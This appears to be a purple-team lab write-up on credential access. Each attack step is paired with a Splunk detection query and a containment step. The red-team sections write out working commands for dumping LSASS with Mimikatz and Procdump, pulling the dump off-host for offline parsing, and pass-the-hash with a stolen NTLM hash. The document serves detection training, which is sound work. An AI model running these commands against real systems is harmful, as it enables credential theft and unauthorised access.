🚩 **Phase 4: Credential Access — Live Extraction, Offline Dumping, and Pass-the-Hash**

## Overview

**Objective**  
Extract and weaponize credential material from the compromised host. This phase demonstrates live credential dumping, stealth offline memory extraction, and reuse of stolen authentication hashes.

**MITRE ATT&CK Mapping**
- **T1003.001:** LSASS Memory  
- **T1550.002:** Pass the Hash  

Credential access transitions the attacker from system compromise to identity compromise.

---

## Phase 4a — Online Credential Extraction (Mimikatz)

**Scenario**  
The attacker interacts directly with LSASS memory through an active implant to retrieve live logon credentials.

---

### Attack Simulation (Red Team)

Credential dumping is executed from a SYSTEM-level session.

**Command**
```bash
getprivs
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

**[Screenshot required]**

Credentials are extracted directly from memory without creating a dump file.

---

### Detection & Hunting (Blue Team — Splunk)

**Detection Logic**  
Unauthorized processes requesting handle access to LSASS strongly indicate credential dumping.

**Query**
```spl
index=windows EventCode=10 
TargetImage="C:\\Windows\\system32\\lsass.exe" 
| stats count by _time, SourceImage, GrantedAccess, dest
```

**[Screenshot required]**

**Assessment**  
Non-system binaries accessing LSASS memory represent high-confidence credential theft activity.

---

## Phase 4b — Offline Credential Dumping (Procdump)

**Scenario**  
To reduce on-host detection, a signed Microsoft tool is used to dump LSASS memory to disk for offline analysis.

This blends malicious behavior with legitimate administrative tooling.

---

### Attack Simulation (Red Team)

A Sysinternals utility is staged and executed to create a memory dump.

**Command**
```bash
C:\Windows\Temp\procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp /accepteula
download C:\Windows\Temp\lsass.dmp /home/kali/lsass.dmp
wine mimikatz.exe
sekurlsa::minidump /home/kali/lsass.dmp
sekurlsa::logonpasswords
```

**[Screenshot required]**

Credential parsing occurs off-host to minimize endpoint visibility.

---

### Detection & Hunting (Blue Team — Splunk)

**Detection Logic**  
Execution of Procdump targeting LSASS memory is a high-fidelity credential theft signal.

**Query**
```spl
index=windows EventCode=1 
Image="*\\procdump*.exe" 
CommandLine="*-ma lsass.exe*"
| table _time, User, CommandLine, ParentImage
```

**[Screenshot required]**

**Assessment**  
Use of legitimate administrative tooling against LSASS is strongly associated with credential exfiltration.

---

## Phase 4c — Pass the Hash (PtH)

**Scenario**  
Extracted NTLM hashes are reused directly for authentication without cracking.

This enables immediate privilege reuse and lateral movement.

---

### Attack Simulation (Red Team)

**Command**
```bash
mimikatz "sekurlsa::pth /user:FADWIN10 /domain:FADHLI-PC /ntlm:<hash> /run:cmd.exe"
```

**[Screenshot required]**

Authentication is performed using the stolen hash rather than a password.

---

### Detection & Hunting (Blue Team — Splunk)

**Detection Logic**  
NewCredentials logons are a signature artifact of Pass-the-Hash behavior.

**Query**
```spl
index=windows EventCode=4624 
Logon_Type=9 
Authentication_Package=Negotiate 
Logon_Process=seclogo
| table _time, TargetUserName, IpAddress, Logon_Type
```

**[Screenshot required]**

**Assessment**  
Logon Type 9 with seclogo indicates credential impersonation via hash reuse.

---

## SOC Decision & Response

**Status:** ACTIVE CREDENTIAL COMPROMISE

**Immediate Containment**
- Reset compromised credentials  
- Isolate affected host  
- Remove credential dump artifacts  
- Investigate lateral authentication activity  

---

## Key Takeaway

Credential access progressed from extraction to operational use:

- Live credential dumping  
- Stealth offline memory parsing  
- Authentication via stolen hashes  

At this stage, the attacker controls identity, not just the system. Detection depends on monitoring LSASS access, abuse of administrative tools, and abnormal authentication behavior.
